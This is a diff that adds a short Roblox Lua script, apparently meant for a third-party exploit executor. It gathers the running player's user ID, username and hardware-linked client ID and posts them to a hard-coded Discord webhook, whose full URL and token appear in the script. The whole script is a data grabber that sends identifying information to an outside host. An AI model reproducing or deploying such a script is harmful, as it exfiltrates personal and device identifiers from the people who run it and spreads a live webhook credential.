@@ -1,0 +1,25 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local userId = player.UserId
+local username = player.Name
+local clientId = "Executor"
+
+-- Get client ID if possible
+pcall(function()
+    clientId = game:GetService("RbxAnalyticsService"):GetClientId() or "Executor"
+end)
+
+-- Format and send data
+local webhookUrl = "https://discord.com/api/webhooks/1368393336183849085/hd-r2quKsj1_nw5YK1JEBHlpktkTVlGJH_hIB4W5aBJyL_Ik3WdtW16mZ_kU-avGYKkI"
+local data = {content = "0,UserID,"..userId..",Clientid,"..clientId..",Username,"..username}
+
+-- Send HTTP request (works in most executors)
+request({
+    Url = webhookUrl,
+    Method = "POST",
+    Headers = {["Content-Type"] = "application/json"},
+    Body = HttpService:JSONEncode(data)
+})
+
+print("Sent info to webhook")
